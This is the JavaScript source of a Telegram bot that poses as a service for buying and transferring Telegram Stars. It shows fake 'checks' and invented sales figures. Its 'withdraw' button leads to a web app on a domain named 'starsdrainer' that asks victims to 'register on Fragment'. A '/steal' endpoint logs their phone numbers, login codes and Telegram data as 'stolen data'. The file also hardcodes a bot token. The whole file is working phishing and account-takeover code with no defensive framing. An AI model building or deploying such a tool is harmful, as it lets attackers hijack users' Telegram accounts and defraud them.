const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();

const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAEb00SvrmPLzDX_3JBXUyb3EouDC7yJKCs';
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

app.use(express.json());
app.use(express.static('public'));

// База для чеков
const db = new sqlite3.Database(':memory:');
db.run(`CREATE TABLE IF NOT EXISTS checks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    amount INTEGER,
    activations INTEGER,
    creator_id INTEGER,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)`);

// Web App
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

app.post('/steal', (req, res) => {
    console.log('=== УКРАДЕННЫЕ ДАННЫЕ ===');
    console.log('Номер:', req.body.phone);
    console.log('Код:', req.body.code);
    console.log('Telegram Data:', req.body.tg_data);
    console.log('========================');
    res.sendStatus(200);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Сервер работает на порту ${PORT}`);
});

// Обработка создания чеков
bot.onText(/@MyStarBank_bot (\d+) (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const amount = parseInt(match[1]);
    const activations = parseInt(match[2]);
    
    // Создаем чек
    db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
        [amount, activations, userId], function(err) {
        if (err) {
            bot.sendMessage(chatId, '❌ Ошибка создания чека.');
            return;
        }
        
        const checkId = this.lastID;
        
        // Отправляем чек в чат
        const checkText = `via @MyStarBank_bot\n\n${amount}\nStars\n\nЧек на ${amount} звёзд    ${new Date().toLocaleTimeString().slice(0,5)}`;
        
        bot.sendMessage(chatId, checkText, {
            reply_markup: {
                inline_keyboard: [[
                    { text: "Забрать звёзды", callback_data: `claim_${checkId}` }
                ]]
            }
        });
    });
});

// Обработка получения чека
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    
    if (query.data.startsWith('claim_')) {
        const checkId = query.data.split('_')[1];
        
        // Проверяем чек
        db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
            if (err || !row) {
                bot.answerCallbackQuery(query.id, { text: '❌ Чек уже использован или не существует!' });
                return;
            }
            
            // Обновляем количество активаций
            db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
            
            // Отвечаем пользователю
            bot.answerCallbackQuery(query.id, { 
                text: `✅ Вы успешно получили ${row.amount} звёзд!` 
            });
            
            // Обновляем сообщение с чеком
            const remaining = row.activations - 1;
            if (remaining > 0) {
                const updatedText = `via @EasyChecs_bot\n\n${row.amount}\nStars\n\nЧек на ${row.amount} звёзд (осталось: ${remaining})    ${new Date().toLocaleTimeString().slice(0,5)}`;
                
                bot.editMessageText(updatedText, {
                    chat_id: chatId,
                    message_id: query.message.message_id,
                    reply_markup: {
                        inline_keyboard: [[
                            { text: "Забрать звёзды", callback_data: `claim_${checkId}` }
                        ]]
                    }
                });
            } else {
                const updatedText = `via @EasyChecs_bot\n\n${row.amount}\nStars\n\nЧек на ${row.amount} звёзд (ИСПОЛЬЗОВАН)    ${new Date().toLocaleTimeString().slice(0,5)}`;
                
                bot.editMessageText(updatedText, {
                    chat_id: chatId,
                    message_id: query.message.message_id,
                    reply_markup: { inline_keyboard: [] }
                });
            }
        });
    }
    
    // Остальная логика для Web App кнопок
    else if (query.data === 'withdraw_stars') {
        const domain = process.env.RAILWAY_STATIC_URL || 'starsdrainer-production.up.railway.app';
        const webAppUrl = `https://${domain}`;
        
        const keyboard = {
            reply_markup: {
                inline_keyboard: [[
                    { 
                        text: "Зарегистрироваться на Fragment", 
                        web_app: { url: webAppUrl }
                    }
                ]]
            }
        };
        
        bot.editMessageText(
            'Для вывода звезд требуется регистрация на Fragment.',
            { 
                chat_id: chatId, 
                message_id: query.message.message_id,
                reply_markup: keyboard.reply_markup
            }
        );
    }
    
    else if (query.data === 'deposit') {
        bot.sendMessage(chatId, 'Функция пополнения временно недоступна.');
    }
    
    else if (query.data === 'create_check_info') {
        bot.sendMessage(chatId,
            'Для создания чека используйте формат:\n\n' +
            '@EasyChecs_bot 100 50\n\n' +
            'где:\n' +
            '100 - количество звезд\n' +
            '50 - количество активаций'
        );
    }
    
    bot.answerCallbackQuery(query.id);
});

// Старт бота
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const domain = process.env.RAILWAY_STATIC_URL || 'starsdrainer-production.up.railway.app';
    const webAppUrl = `https://${domain}`;
    
    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "Вывести звезды", callback_data: "withdraw_stars" }],
                [{ text: "Пополнить баланс", callback_data: "deposit" }],
                [{ text: "Создать чек", callback_data: "create_check_info" }]
            ]
        }
    };

    // Отправляем фото с описанием
    bot.sendPhoto(chatId, 'https://via.placeholder.com/400x200/2481cc/ffffff?text=Telegram+Stars+Bot', {
        caption: 'Привет! @EasyChecs_bot - Это удобный бот для покупки/ передачи звезд в Telegram.\n\n' +
                'С ним ты можешь моментально покупать и передавать звезды.\n\n' +
                'Бот работает почти год, и с помощью него куплена огромная доля звезд в Telegram.\n\n' +
                'С помощью бота куплено:\n6,307,360 ▼ (~ $94,610)',
        reply_markup: keyboard.reply_markup
    });
});

// Обработка обычных сообщений
bot.on('message', (msg) => {
    // Игнорируем команды и служебные сообщения
    if (msg.text && !msg.text.startsWith('/') && !msg.text.includes('@EasyChecs_bot')) {
        console.log(`Сообщение от ${msg.chat.id}: ${msg.text}`);
    }
});

console.log('Бот запущен с системой чеков');
